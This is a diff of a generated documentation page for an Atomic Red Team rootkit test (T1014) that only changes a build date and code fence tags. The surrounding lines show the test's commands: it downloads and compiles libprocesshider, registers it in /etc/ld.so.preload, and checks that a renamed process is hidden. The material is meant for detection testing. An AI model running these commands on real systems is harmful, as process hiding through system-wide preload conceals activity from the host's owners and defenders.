@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1014"
 attack_technique_name: "Rootkit"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3"
@@ -64,13 +64,13 @@ The preload library must exist on disk at specified location (#{library_path})
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -f #{library_path} ]; then exit 0; else exit 1; fi;
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 mkdir -p /tmp/atomic && cd /tmp/atomic
 curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
 make
@@ -85,14 +85,14 @@ cp /usr/bin/ping /usr/local/bin/evil_script.py
 
 ### Command
 
-```sh
+```bash
 echo #{library_path} | tee -a /etc/ld.so.preload
 /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
 ```
 
 ### Cleanup
 
-```sh
+```bash
 sed -i "\:^#{library_path}:d" /etc/ld.so.preload
 rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
 ```
